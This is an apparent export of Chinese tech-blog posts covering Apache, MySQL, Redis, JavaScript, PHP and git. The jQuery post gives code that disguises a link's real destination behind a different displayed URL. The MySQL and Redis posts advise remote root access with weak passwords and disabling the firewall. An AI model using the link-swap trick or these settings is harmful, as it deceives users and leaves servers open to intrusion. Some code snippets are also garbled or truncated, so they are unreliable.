《一起把握幸福的方向》 等待 一个人的漫长 在最美的时刻遇见 偶然，闯进了你的全世界 打开，那凋零颓圮的篱墙 一点点 融化了那座不释的冰山 消散了所有烟雨的惆怅 逃不开 你柔情的双肩和臂膀 终在这交会时互放着光亮 愿意 用手中的调色盘 为你绘制生命的绚烂 愿意 让生命承载眷恋 与你共赴人间华芳 愿意 将你奉若神灵 一起把握幸福的方向 &nbsp;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Linux下apache安全配置策略]]></title>
      <url>%2F2017%2F02%2F13%2Flinux%E4%B8%8Bapache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E7%AD%96%E7%95%A5%2F</url>
      <content type="text"><![CDATA[Apache具有灵活的设置，所有Apache的安全特性都要经过周密的设计与规划，进行认真地配置才能够实现。Apache安全配置包括很多层面，有运行环境、认证与授权设置等。Apache的安装配置和运行示例如下：1、基本配置 1) 修改apache的版本信息，使外部访问看到的apache信息是经过伪装或错误的，这个可以尽可能的保证apache的安全。2) 建立安全的apache的目录结构。ServerRoot DocumentRoot ScripAlias Customlog Errorlog 均放在单独的目录环境中。以上主要目录相互独立并且不存在父子逻辑关系。3) ServerRoot目录只能具有管理权限用户访问；DocumentRoot能够被管理Web站点内容的用户访问和使用Apache服务器的Apache用户和Apache用户组访问；只有admin组的用户可以访问日志目录。 各个目录设置独立的权限4) 禁止默认访问的存在，只对指定的目录开启访问权限。5) 更改apache的默认路径，单独建立路径提供apache文件的存放6) 通过使用例如“Apache DoS Evasive Maneuvers Module ”等工具来实现Apache服务器对DoS攻击的防范。其工具可以快速拒绝来自相同地址对同一URL的重复请求。7) 以Nobody用户运行一般情况下，Apache是由Root 来安装和运行的。如果Apache Server进程具有Root用户特权，那么它将给系统的安全构成很大的威胁，应确保Apache Server进程以最可能低的权限用户来运行。通过修改httpd.conf文件中的下列选项，以Nobody用户运行Apache 达到相对安全的目的。User nobody 2、ServerRoot目录的权限为了确保所有的配置是适当的和安全的，需要严格控制Apache 主目录的访问权限，使非超级用户不能修改该目录中的内容。Apache 的主目录对应于Apache Server配置文件httpd.conf的Server Root控制项中，应为：Server Root /usr/local/apache3、SSI的配置在配置文件access.conf 或httpd.conf中的确Options指令处加入Includes NO EXEC选项，用以禁用Apache Server 中的执行功能。避免用户直接执行Apache 服务器中的执行程序，而造成服务器系统的公开化。Options Includes Noexec4、阻止用户修改系统设置在Apache 服务器的配置文件中进行以下的设置，阻止用户建立、修改 .htaccess文件，防止用户超越能定义的系统安全特性。 AllowOveride NoneOptions NoneAllow from all然后再分别对特定的目录进行适当的配置。5、改变Apache 服务器的确省访问特性Apache 的默认设置只能保障一定程度的安全，如果服务器能够通过正常的映射规则找到文件，那么客户端便会获取该文件，如http://local host/~ root/ 将允许用户访问整个文件系统。在服务器文件中加入如下内容： order deny,ellowDeny from all将禁止对文件系统的缺省访问。6、CGI脚本的安全考虑CGI脚本是一系列可以通过Web服务器来运行的程序。为了保证系统的安全性，应确保CGI的作者是可信的。对CGI而言，最好将其限制在一个特定的 目录下，如cgi-bin之下，便于管理；另外应该保证CGI目录下的文件是不可写的，避免一些欺骗性的程序驻留或混迹其中；如果能够给用户提供一个安全 性良好的CGI程序的模块作为参考，也许会减少许多不必要的麻烦和安全隐患；除去CGI目录下的所有非业务应用的脚本，以防异常的信息泄漏。以上这些常用的举措可以给Apache Server 一个基本的安全运行环境，显然在具体实施上还要做进一步的细化分解，制定出符合实际应用的安全配置方案。Apache Server基于主机的访问控制Apache Server默认情况下的安全配置是拒绝一切访问。假定Apache Server内容存放在/usr/local/apache/share 目录下，下面的指令将实现这种设置： Deny from allAllow Override None则禁止在任一目录下改变认证和访问控制方法。 同样，可以用特有的命令Deny、Allow指定某些用户可以访问，哪些用户不能访问，提供一定的灵活性。当Deny、Allow一起用时，用命令Order决定Deny和Allow合用的顺序，如下所示：1、 拒绝某类地址的用户对服务器的访问权（Deny）如：Deny from all Deny from test.cnn.comDeny from 204.168.190.13Deny from 10.10.10.0/255.255.0.02、 允许某类地址的用户对服务器的访问权（Allow）如：Allow from allAllow from test.cnn.comAllow from 204.168.190.13Allow from 10.10.10.0/255.255.0.0Deny和Allow指令后可以输入多个变量。3、简单配置实例： Order Allow, DenyAllow from allDeny from www.test.com指想让所有的人访问Apache服务器，但不希望来自www.test.com的任何访问。 Order Deny, AllowDeny from allAllow from test.cnn.com指不想让所有人访问，但希望给test.cnn.com网站的来访。Apache Sever的用户认证与授权概括的讲，用户认证就是验证用户的身份的真实性，如用户帐号是否在数据库中，及用户帐号所对应的密码是否正确；用户授权表示检验有效用户是否被许可访 问特定的资源。在Apache中，几乎所有的安全模块实际上兼顾这两个方面。从安全的角度来看，用户的认证和授权相当于选择性访问控制。建立用户的认证授权需要三个步骤：1、建立用户库用户名和口令列表需要存在于文件（mod_auth模块）或数据库（mod_auth_dbm模块）中。基于安全的原因，该文件不能存放在文挡的根目 录下。如，存放在/usr/local/etc/httpd下的users文件，其格式与UNIX口令文件格式相似，但口令是以加密的形式存放的。应用程 序htpasswd可以用来添加或更改程序：htpasswd –c /usr/local/etc/httpd/users martin-c表明添加新用户，martin为新添加的用户名，在程序执行过程中，两次输入口令回答。用户名和口令添加到users文件中。产生的用户文件有如下的形式：martin:WrU808BHQai36jane:iABCQFQs40E8Mart:FadHN3W753sSU第一域是用户名，第二个域是用户密码。2、配置服务器的保护域为了使Apache服务器能够利用用户文件中的用户名和口令信息，需要设置保护域（Realm）。一个域实际上是站点的一部分（如一个目录、文档等） 或整个站点只供部分用户访问。在相关目录下的.htaccess文件或httpd.conf ( acces.conf ) 中的段中，由AuthName来指定被保护层的域。在.htaccess文件中对用户文件有效用户的授权访问及指定域保护有如下指定： AuthName “restricted stuff”Authtype BasicAuthUserFile /usr/local/etc/httpd/usersRequire valid-user其中，AuthName指出了保护域的域名（Realm Name）。valid-user参数意味着user文件中的所有用户都是可用的。一旦用户输入了一个有效的用户/口令时，同一个域内的其他资源都可以利 用同样的用户/口令来进行访问，同样可以使两个不同的区域共用同样的用户/口令。3、告诉服务器哪些用户拥有资源的访问权限如果想将一资源的访问权限授予一组客户，可以将他们的名字都列在Require之后。最好的办法是利用组（group）文件。组的操作和标准的UNIX的组的概念类似，任一个用户可以属于一个和数个组。这样就可以在配置文件中利用Require对组赋予某些权限。如： Require group staffRequire group staff adminRequire user adminuser指定了一个组、几个组或一个用户的访问权限。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Apache 配置虚拟主机]]></title>
      <url>%2F2017%2F02%2F12%2Fapache-%E9%85%8D%E7%BD%AE%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%2F</url>
      <content type="text"><![CDATA[&nbsp; 一、基于主机名1. 设置域名映射同一个IP，修改hosts：192.168.1.58 www.test1.com192.168.1.58 www.test2.com2. 跟上面一样，建立虚拟主机存放网页的根目录/www/test1/1.html/www/test2/2.html3. 在httpd.conf中将附加配置文件httpd-vhosts.conf包含进来，接着在httpd-vhosts.conf中写入如下配置：为了使用基于域名的虚拟主机，必须指定服务器IP地址（和可能的端口）来使主机接受请求。可以用NameVirtualHost指令来进行配置。 如果服务器上所有的IP地址都会用到， 你可以用作为NameVirtualHost的参数。在NameVirtualHost指令中指明IP地址并不会使服务器自动侦听那个IP地址。 这里设定的IP地址必须对应服务器上的一个网络接口。下一步就是为你建立的每个虚拟主机设定配置块，的参数与NameVirtualHost指令的参数是一样的。每个定义块中，至少都会有一个ServerName指令来指定伺服哪个主机和一个DocumentRoot指令来说明这个主机的内容存在于文件系统的什么地方。如果在现有的web服务器上增加虚拟主机，必须也为现存的主机建造一个定义块。其中ServerName和DocumentRoot所包含的内容应该与全局的保持一致，且要放在配置文件的最前面，扮演默认主机的角色。&lt;VirtualHost :80&gt; ServerName www.test1.com DocumentRoot /www/test1/ Options Indexes FollowSymLinks AllowOverride None Order allow,deny Allow from all ServerName www.test2.com DocumentRoot /www/test2/ Options Indexes FollowSymLinks AllowOverride None Order allow,deny Allow from all &nbsp;4. 大功告成，测试下每个虚拟主机，分别访问www.test1.com、www.test2.com二、基于端口1. 修改配置文件将原来的Listen 80改为Listen 80Listen 80802. 更改虚拟主机设置：复制代码DocumentRoot /var/www/test1/ServerName www.test1.comDocumentRoot /var/www/test2ServerName www.test2.com&nbsp;三、基于IP1. 假设服务器有个IP地址为192.168.1.10，使用ifconfig在同一个网络接口eth0上绑定2个IP：[root@localhost root]# ifconfig eth0:1 192.168.1.11[root@localhost root]# ifconfig eth0:2 192.168.1.122. 修改hosts文件，添加三个域名与之一一对应：192.168.1.11 www.test1.com192.168.1.12 www.test2.com3. 建立虚拟主机存放网页的根目录，如在/www目录下建立test1、test2、test3文件夹，其中分别存放1.html、2.html、3.html/www/test1/1.html/www/test2/2.html4. 在httpd.conf中将附加配置文件httpd-vhosts.conf包含进来，接着在httpd-vhosts.conf中写入如下配置： ServerName www.test1.com DocumentRoot /www/test1/ Options Indexes FollowSymLinks AllowOverride None Order allow,deny Allow From All ServerName www.test1.com DocumentRoot /www/test2/ Options Indexes FollowSymLinks AllowOverride None Order allow,deny Allow From All 5. 大功告成，测试下每个虚拟主机，分别访问www.test1.com、www.test2.com]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS身份证号码验证以及性别]]></title>
      <url>%2F2017%2F02%2F12%2Fjs%E8%BA%AB%E4%BB%BD%E8%AF%81%E5%8F%B7%E7%A0%81%E9%AA%8C%E8%AF%81%E4%BB%A5%E5%8F%8A%E6%80%A7%E5%88%AB%2F</url>
      <content type="text"><![CDATA[&nbsp; 身份证验证在WEB开发中经常遇到，因为现在是新老身份证过渡期，所以判断身份证不光是要判断18位新身份证号码，还要照顾到15位的老身份证号，有些麻烦，不过掌握了Js算法，一切就简单了，本Js函数不但实现了15位、18位身份证号码的判断，而且还可判断男女是否和身份证相符。 &nbsp; var powers=new Array(“7”,”9”,”10”,”5”,”8”,”4”,”2”,”1”,”6”,”3”,”7”,”9”,”10”,”5”,”8”,”4”,”2”);var parityBit=new Array(“1”,”0”,”X”,”9”,”8”,”7”,”6”,”5”,”4”,”3”,”2”);var sex=”male”;function validId(obj){ var _id=obj.value; if(_id==””)return; var _valid=false; if(_id.length==15){ _valid=validId15(_id); }else if(_id.length==18){ _valid=validId18(_id); } if(!_valid){ alert(“身份证号码有误,请检查!”); obj.focus(); return; } //设置性别 var sexSel=document.getElementByIdx(“sex”); var options=sexSel.options; for(var i=0;i]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[阻止JS冒泡事件]]></title>
      <url>%2F2017%2F02%2F12%2F%E9%98%BB%E6%AD%A2js%E5%86%92%E6%B3%A1%E4%BA%8B%E4%BB%B6%2F</url>
      <content type="text"><![CDATA[什么是JS事件冒泡？： 在一个对象上触发某类事件（比如单击onclick事件），如果此对象定义了此事件的处理程序，那么此事件就会调用这个处理程序，如果没有定义此事件处理程序或者事件返回true，那么这个事件会向这个对象的父级对象传播，从里到外，直至它被处理（父级对象所有同类事件都将被激活），或者它到达了对象层次的最顶层，即document对象（有些浏览器是window）。 解决方法 1.JavaScript 阻止事件冒泡，无使用其它插件来辅助，原生JS代码，考虑到浏览器的兼容性问题，这里对IE/火狐、Operating以及Chrome都有针对性的判断，代码如下： function cancelBubble(evt) {// 阻止事件冒泡if (window.event) {// Chrome,IE6,Operawindow.event.cancelBubble = true;} else {// FireFox 3evt.stopPropagation();}2. 2.return false; 如果头部加入的是以下代码 $(function() { $(“#hr_three”).click(function(event) { return false; });}); 再点击“点击我”，会弹出：我是最里层，但不会执行链接到百度页面]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JQuery动态修改a标签链接地址]]></title>
      <url>%2F2017%2F02%2F10%2Fjquery%E5%8A%A8%E6%80%81%E4%BF%AE%E6%94%B9a%E6%A0%87%E7%AD%BE%E9%93%BE%E6%8E%A5%E5%9C%B0%E5%9D%80%2F</url>
      <content type="text"><![CDATA[在一个项目中，想隐藏真实的链接地址，使用JQuery的事件可以解决这个问题，代码如下： $(document).ready(function(){ //动态修改href值 $("#aid").mouseenter(function(){//鼠标划过或停留时显示正常地址，并保证点击后仍然显示正常地址 $(this).attr('href','http://www.baidu.com/'); }).click(function(){//链接被点击时打开实际地址 $(this).attr('href','http://126.am/Ho9PX2'); }); }); 代码执行的结果是，普通浏览者点击后会打开我们想要的地址，而不是显示的那个地址。如果同样的动作要执行多次，也可以封装成一个JQuery函数或插件， $.fn.ChangeHref = function(show_url, click_url) { $(this).mouseenter(function(){ $(this).attr('href',show_url); }).click(function(){ $(this).attr('href',click_url); }); }; $("#aid").ChangeHref('http://www.baidu.com/, 'http://126.am/Ho9PX2');//调用函数]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[redis-cluster安装和配置]]></title>
      <url>%2F2017%2F02%2F09%2Fredis-cluster%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%2F</url>
      <content type="text"><![CDATA[1.Redis集群介绍Redis 集群是一个提供在多个Redis间节点间共享数据的程序集。 Redis集群并不支持处理多个keys的命令,因为这需要在不同的节点间移动数据,从而达不到像Redis那样的性能,在高负载的情况下可能会导致不可预料的错误. Redis 集群通过分区来提供一定程度的可用性,在实际环境中当某个节点宕机或者不可达的情况下继续处理命令. Redis 集群的优势: 自动分割数据到不同的节点上。 整个集群的部分节点失败或者不可达的情况下能够继续处理命令。 2. 集群搭建本次为实验教程，所以在一台虚拟机中进行搭建，跟在多台真机上搭建其实没有什么区别，只要保证网络通信ok就可以了！ 我们在几台机器上通过端口号的不同，搭建一个伪集群。在一个服务器上创建多个redis实例。端口号如下所示 主节点：127.0.0.1:7001 127.0.0.1:7002127.0.0.1:7003 从节点：127.0.0.1:7004127.0.0.1:7005127.0.0.1:7006 在/usr/local下创建redis-cluster目录，其下创建redis01、redis02。。redis06目录，如下： 然后我们将redis 安装到redis01中，安装完以后我们在将Redis编译目录中的redis。Conf文件复制到redis01目录下，就会看到在redis01目录下会有如下的文件。 然后我们将redis01文件夹的文件分别复制到redis02……redis06文件夹中。同时将redis源码目录src下的redis-trib.rb拷贝到redis-cluster目录下。 修改每个文件夹下的配置文件，有三点需要修改，每个配置文件都要配置自己的端口号，不能重复。 准备好以上工作以后，我们分别启动每个redis进行的实例。如果麻烦的话，可以自己写一个执行脚本。启动完毕以后我们输入命令ps ax|grep redis ，查看实例是否启动，出现如下所以图片，表示所有的实例都启动了。 接下来创建集群关联 redis-trib.rb create –replicas 1 127.0.0.1:7000 127.0.0.1:7001 127.0.0.1:7002 127.0.0.1:7003 127.0.0.1:7004 127.0.0.1:7005如果是多服务器，请自行修改对应的IP和端口号。一切成功的话，会出现一些Redis集群的相关，包括所有的Master和Slave的信息。 此处有坑，无限点点，一直 Waiting for the cluster to join…1,当有多台机器时，执行 redis-trib.rb create –replicas命令时不要写127.0.0.1，直接写服务器ip和端口号 2，检查各集群服务器的防火墙端口，如果配置麻烦可以直接关闭防火墙 3，redis配置文件有没有bind 127.0.0.1，如果有注释掉 &nbsp; 待一切结束之后使用命令 redis-trib.rb check 127.0.0.1:7001就可查看集群状态以及主从信息 &nbsp;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[MySQL 重设密码以及允许远程访问]]></title>
      <url>%2F2017%2F02%2F08%2Fmysql-%E9%87%8D%E8%AE%BE%E5%AF%86%E7%A0%81%E4%BB%A5%E5%8F%8A%E5%85%81%E8%AE%B8%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AE%2F</url>
      <content type="text"><![CDATA[mysql 重设密码修改MySQL的配置文件（默认为/etc/my.cnf）,在[mysqld]下添加一行skip-grant-tables保存配置文件后，重启MySQL服务 service mysqld restart再次进入MySQL命令行 mysql -uroot -p,输入密码时直接回车，就会进入MySQL数据库了，这个时候按照常规流程修改root密码即可。UPDATE user SET Password=password(“test123”) WHERE user=’root’; mysql允许远程访问1.vim /etc/mysql/my.cnf注释掉bindaddress 127.0.0.1mysql -uroot -pmysql&gt;update user set host = ‘%’ where user = ‘root’;mysql&gt;GRANT ALL PRIVILEGES ON ._ TO ‘myuser’@’%’ IDENTIFIED BY ‘mypassword’ WITH GRANT OPTION;2.首先以 root 帐户登陆 MySQL MySQL -uroot -p (123456 为 root 用户的密码。)创建远程登陆用户并授权grant all PRIVILEGES on test_db.* to root@’192.168.1.101’ identified by ‘123456’;上面的语句表示将 test_db 数据库的所有权限授权给 root 这个用户，允许 root 用户在 192.168.1.101 这个 IP 进行远程登陆，并设置 root 用户的密码为 123456 。 下面逐一分析所有的参数： all PRIVILEGES 表示赋予所有的权限给指定用户，这里也可以替换为赋予某一具体的权限，例如select,insert,update,delete,create,drop 等，具体权限间用“,”半角逗号分隔。 test_db. 表示上面的权限是针对于哪个表的，test_db指的是数据库，后面的 表示对于所有的表，由此可以推理出：对于全部数据库的全部表授权为“.”，对于某一数据库的全部表授权为“数据库名.*”，对于某一数据库的某一表授权为“数据库名.表名”。 root 表示你要给哪个用户授权，这个用户可以是存在的用户，也可以是不存在的用户。 192.168.1.101 表示允许远程连接的 IP 地址，如果想不限制链接的 IP 则设置为“%”即可。 123456 为用户的密码。 执行了上面的语句后，再执行下面的语句，方可立即生效。 flush privileges;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ＭySQL隔离级别]]></title>
      <url>%2F2017%2F02%2F08%2Fmysql%E9%9A%94%E7%A6%BB%E7%BA%A7%E5%88%AB%2F</url>
      <content type="text"><![CDATA[SQL标准定义了4类隔离级别，包括了一些具体规则，用来限定事务内外的哪些改变是可见的，哪些是不可见的。低级别的隔离级一般支持更高的并发处理，并拥有更低的系统开销。1.Read Uncommitted（读取未提交内容）在该隔离级别，所有事务都可以看到其他未提交事务的执行结果。本隔离级别很少用于实际应用，因为它的性能也不比其他级别好多少。读取未提交的数据，也被称之为脏读（Dirty Read）。2.Read Committed（读取提交内容）这是大多数数据库系统的默认隔离级别（但不是MySQL默认的）。它满足了隔离的简单定义：一个事务只能看见已经提交事务所做的改变。这种隔离级别 也支持所谓的不可重复读（Nonrepeatable Read），因为同一事务的其他实例在该实例处理其间可能会有新的commit，所以同一select可能返回不同结果。3.Repeatable Read（可重读）这是MySQL的默认事务隔离级别，它确保同一事务的多个实例在并发读取数据时，会看到同样的数据行。不过理论上，这会导致另一个棘手的问题：幻读 （Phantom Read）。简单的说，幻读指当用户读取某一范围的数据行时，另一个事务又在该范围内插入了新行，当用户再读取该范围的数据行时，会发现有新的“幻影” 行。InnoDB和Falcon存储引擎通过多版本并发控制（MVCC，Multiversion Concurrency Control）机制解决了该问题。 4.Serializable（可串行化） 这是最高的隔离级别，它通过强制事务排序，使之不可能相互冲突，从而解决幻读问题。简言之，它是在每个读的数据行上加上共享锁。在这个级别，可能导致大量的超时现象和锁竞争。这四种隔离级别采取不同的锁类型来实现，若读取的是同一个数据的话，就容易发生问题。例如：脏读(Drity Read)：某个事务已更新一份数据，另一个事务在此时读取了同一份数据，由于某些原因，前一个RollBack了操作，则后一个事务所读取的数据就会是不正确的。不可重复读(Non-repeatable read):在一个事务的两次查询之中数据不一致，这可能是两次查询过程中间插入了一个事务更新的原有的数据。幻读(Phantom Read):在一个事务的两次查询中数据笔数不一致，例如有一个事务查询了几列(Row)数据，而另一个事务却在此时插入了新的几列数据，先前的事务在接下来的查询中，就会发现有几列数据是它先前所没有的。在MySQL中，实现了这四种隔离级别，分别有可能产生问题如下所示： 下面，将利用MySQL的客户端程序，分别测试几种隔离级别。测试数据库为test，表为tx；表结构： id int num int 两个命令行客户端分别为A，B；不断改变A的隔离级别，在B端修改数据。（一）、将A的隔离级别设置为read uncommitted(未提交读)在B未更新数据之前：客户端A：B更新数据：客户端B： 客户端A： 经过上面的实验可以得出结论，事务B更新了一条记录，但是没有提交，此时事务A可以查询出未提交记录。造成脏读现象。未提交读是最低的隔离级别。 `&lt;/pre&gt; （二）、将客户端A的事务隔离级别设置为read committed(已提交读) 在B未更新数据之前： 客户端A：![这里写图片描述](http://dl.iteye.com/upload/picture/pic/72626/ae414e52-c216-3bbb-b005-0d972f593456.jpg) B更新数据： 客户端B：![这里写图片描述](http://dl.iteye.com/upload/picture/pic/72628/12051f3d-c01e-34b3-a6b6-8b71e1b1dcc8.jpg) 客户端A：![这里写图片描述](http://dl.iteye.com/upload/picture/pic/72630/cc80744e-eb9f-3104-bb24-2218e9986d78.jpg) &lt;pre&gt;` 经过上面的实验可以得出结论，已提交读隔离级别解决了脏读的问题，但是出现了不可重复读的问题，即事务A在两次查询的数据不一致，因为在两次查询之间事务B更新了一条数据。已提交读只允许读取已提交的记录，但不要求可重复读。 `&lt;/pre&gt; (三)、将A的隔离级别设置为repeatable read(可重复读) 在B未更新数据之前： 客户端A：![这里写图片描述](http://dl.iteye.com/upload/picture/pic/72632/0bf52be3-e873-3f3f-8d56-d703a8f678ab.jpg) B更新数据： 客户端B：![这里写图片描述](http://dl.iteye.com/upload/picture/pic/72634/e58d1814-bdca-3313-bcf5-339e3678536a.jpg) 客户端A：![这里写图片描述](http://dl.iteye.com/upload/picture/pic/72636/83bfe583-2d57-345a-917e-4ee163235b62.jpg) B插入数据： 客户端B：![这里写图片描述](http://dl.iteye.com/upload/picture/pic/72636/83bfe583-2d57-345a-917e-4ee163235b62.jpg) 客户端A：![这里写图片描述](http://dl.iteye.com/upload/picture/pic/72640/4398c5b1-434c-3380-ba19-060154cf2070.jpg) &lt;pre&gt;` 由以上的实验可以得出结论，可重复读隔离级别只允许读取已提交记录，而且在一个事务两次读取一个记录期间，其他事务部的更新该记录。但该事务不要求与其他事务可串行化。例如，当一个事务可以找到由一个已提交事务更新的记录，但是可能产生幻读问题(注意是可能，因为数据库对隔离级别的实现有所差别)。像以上的实验，就没有出现数据幻读的问题。 `&lt;/pre&gt; (四)、将A的隔离级别设置为 可串行化 (Serializable) A端打开事务，B端插入一条记录 事务A端：![这里写图片描述](http://dl.iteye.com/upload/picture/pic/72642/c604c5ce-311d-3923-8dcd-36b0188f4f31.jpg) 事务B端：![这里写图片描述](http://dl.iteye.com/upload/picture/pic/72644/c488f9d9-7da2-3e6d-9a82-2b92d1051afd.jpg) 因为此时事务A的隔离级别设置为serializable，开始事务后，并没有提交，所以事务B只能等待。 事务A提交事务： 事务A端 ![这里写图片描述](http://dl.iteye.com/upload/picture/pic/72644/c488f9d9-7da2-3e6d-9a82-2b92d1051afd.jpg) 事务B端 ![这里写图片描述](http://dl.iteye.com/upload/picture/pic/72648/8e60e19b-09af-31a7-b8d3-8e638bbf177c.jpg) &lt;pre&gt;` serializable完全锁定字段，若一个事务来查询同一份数据就必须等待，直到前一个事务完成并解除锁定为止 。是完整的隔离级别，会锁定对应的数据表格，因而会有效率的问题。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[PHP内存溢出解决方案]]></title>
      <url>%2F2017%2F02%2F08%2Fphp%E5%86%85%E5%AD%98%E6%BA%A2%E5%87%BA%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F</url>
      <content type="text"><![CDATA[一．内存溢出解决方案 在做数据统计分析时，经常会遇到大数组，可能会发生内存溢出，这里分享一下我的解决方案。还是用例子来说明这个问题，如下： 假定日志中存放的记录数为500000条，那么解决方案如下： &lt;?php ini_set(‘memory_limit’,’64M’); //重置php可以使用的内存大小为64M，一般在远程主机上是不能修改php.ini文件的，只能通过程序设置。注：在safe_mode（安全模式）下，ini_set失效 set_time_limit(600);//设置超时限制为６分钟 $farr = $Uarr = $Marr = $IParr = $data = $_sub = array(); $spt = ”$@#!$”; $root = ”/Data/webapps/VisitLog”; $path = $dpath = $fpath = NULL; $path = $root.”/”.date(“Y-m”,$timestamp); $dpath = $path.”/”.date(“m-d”,$timestamp); for($j=0;$j&lt;24;$j++){ $v = ($j &lt; 10) ? ”0″.$j : $j; $gpath = $dpath.”/”.$v.”.php”; if(!file_exists($gpath)){ continue; } else { $arr = file($gpath);////将文件读入数组中 array_shift($arr);//移出第一个单元－》&lt;?php exit;?&gt; $farr = array_merge($farr,$arr); unset($arr); } } if(empty($this-&gt;farr)){ echo ” 没有相关记录！”; exit; } while(!empty($farr)){ $_sub = array_splice($farr, 0, 10000); //每次取出$farr中1000个 for($i=0,$scount=count($_sub);$i&lt;$scount;$i++){ $arr = explode($spt,$_sub[$i]); $Uarr[] = $arr[1]; //vurl $Marr[] = $arr[2]; //vmark $IParr[] = $arr[3].” |$nbsp;”.$arr[1]; //IP } unset($_sub);//用完及时销毁 } unset($farr); ?&gt;&nbsp; 这里，不难看出，一方面，我们要增加PHP可用内存大小，另一方面，只要我们想办法对数组进行分批处理，分而治之，将用过的变量及时销毁(unset)，一般是不会出现溢出问题的。 另外，为了节省PHP程序内存损耗，我们应当尽可能减少静态变量的使用，在需要数据重用时，可以考虑使用引用(&amp;)。再一点就是：数据库操作完成后，要马上关闭连接；一个对象使用完，要及时调用析构函数（__destruct()）。 二．unset销毁变量并释放内存问题 PHP的unset()函数用来清除、销毁变量，不用的变量，我们可以用unset()将它销毁。但是某些时候，用unset()却无法达到销毁变 量占用的内存！我们先看一个例子： &nbsp; 最后输出unset()之前占用内存减去unset()之后占用内存，如果是正数，那么说明unset(s)已经将s从内存中销毁(或者说，unset()之后内存占用减少了)，可是我在PHP5和windows平台下，得到的结果是：0。这是否可以说明，unset(s)并没有起到销毁变量s所占用内存的作用呢？我们再作下面的例子： &lt;?php$s=str_repeat(‘1’,256); //产生由256个1组成的字符串$m=memory_get_usage(); //获取当前占用内存unset($s);$mm=memory_get_usage(); //unset()后再查看当前占用内存echo $m-$mm;?&gt;&nbsp; 这个例子，和上面的例子几乎相同，唯一的不同是，s由256个1组成，即比第一个例子多了一个1，得到结果是：272。这是否可以说明，unset(s)已经将$s所占用的内存销毁了？通过上面两个例子，我们可以得出以下结论：结论一、unset()函数只能在变量值占用内存空间超过256字节时才会释放内存空间。 那么是不是只要变量值超过256，使用unset就可以释放内存空间呢？我们再通过一个例子来测试一下： &lt;?php$s=str_repeat(‘1’,256); //这和第二个例子完全相同$p=&amp;$s;$m=memory_get_usage();unset($s); //销毁$s$mm=memory_get_usage();echo $p.’‘;echo $m-$mm;?&gt;&nbsp; 刷新页面，我们看到第一行有256个1，第二行是0，按理说我们已经销毁了s，而p只是引用s的变量，应该是没有内容了，另外，unset(s)前后内存占用没变化！现在我们再做以下的例子： &lt;?php$s=str_repeat(‘1’,256); //这和第二个例子完全相同$p=&amp;$s;$m=memory_get_usage();$s=null; //设置$s为null$mm=memory_get_usage();echo $p.’‘;echo $m-$mm;?&gt;&nbsp; 现在刷新页面，我们看到，输出p已经是没有内容了，unset()前后内存占用量之差是272，即已经清除了变量占用的内存。本例中的s=null也 可以换成unset()，如下： &lt;?php$s=str_repeat(‘1’,256); //这和第二个例子完全相同$p=&amp;$s;$m=memory_get_usage();unset($s); //销毁$sunset($p);$mm=memory_get_usage();echo $p.’‘;echo $m-$mm;?&gt;&nbsp; 我们将s和p都使用unset()销毁，这时再看内存占用量之差也是272，说明这样也可以释放内存。那么，我们可以得到另外一条结论：结论二、只有当指向该变量的所有变量（如引用变量）都被销毁后，才会释放内存。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[git常用命令二]]></title>
      <url>%2F2017%2F02%2F08%2Fgit%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E4%BA%8C%2F</url>
      <content type="text"><![CDATA[Git鼓励大量使用分支：查看分支：git branch创建分支：git branch切换分支：git checkout创建+切换分支：git checkout -b合并某分支到当前分支：git merge删除分支：git branch -d 小结 当Git无法自动合并分支时，就必须首先解决冲突。解决冲突后，再提交，合并完成。用git log –graph命令可以看到分支合并图。通常，合并分支时，如果可能，Git会用Fast forward模式，但这种模式下，删除分支后，会丢掉分支信息。如果要强制禁用Fast forward模式，Git就会在merge时生成一个新的commit，这样，从分支历史上就可以看出分支信息。准备合并dev分支，请注意–no-ff参数，表示禁用Fast forward： $ git merge --no-ff -m "merge with no-ff" dev Merge made by the 'recursive' strategy. readme.txt | 1 + 1 file changed, 1 insertion(+) &nbsp;因为本次合并要创建一个新的commit，所以加上-m参数，把commit描述写进去。合并后，我们用git log看看分支历史： $ git log –graph –pretty=oneline –abbrev-commit 7825a50 merge with no-ff|\| * 6224937 add merge|/ 59bc1cb conflict fixed …&nbsp; 分支策略 在实际开发中，我们应该按照几个基本原则进行分支管理： 首先，master分支应该是非常稳定的，也就是仅用来发布新版本，平时不能在上面干活；那在哪干活呢？干活都在dev分支上，也就是说，dev分支是不稳定的，到某个时候，比如1.0版本发布时，再把dev分支合并到master上，在master分支发布1.0版本你和你的小伙伴们每个人都在dev分支上干活，每个人都有自己的分支，时不时地往dev分支上合并就可以了。所以，团队合作的分支看起来就像这样： git-br-policy小结Git分支十分强大，在团队开发中应该充分应用。合并分支时，加上–no-ff参数就可以用普通模式合并，合并后的历史有分支，能看出来曾经做过合并，而fast forward合并就看不出来曾经做过合并命令git push origin 可以推送一个本地标签；命令git push origin –tags可以推送全部未推送过的本地标签；命令git tag -d 可以删除一个本地标签；命令git push origin :refs/tags/可以删除一个远程标签。 忽略特殊文件有些时候，你必须把某些文件放到Git工作目录中，但又不能提交它们，比如保存了数据库密码的配置文件啦等等，每次git status都会显示Untracked files …，有强迫症的童鞋心里肯定不爽。好在Git考虑到了大家的感受，这个问题解决起来也很简单，在Git工作区的根目录下创建一个特殊的.gitignore文件，然后把要忽略的文件名填进去，Git就会自动忽略这些文件。不需要从头写.gitignore文件，GitHub已经为我们准备了各种配置文件，只需要组合一下就可以使用了。 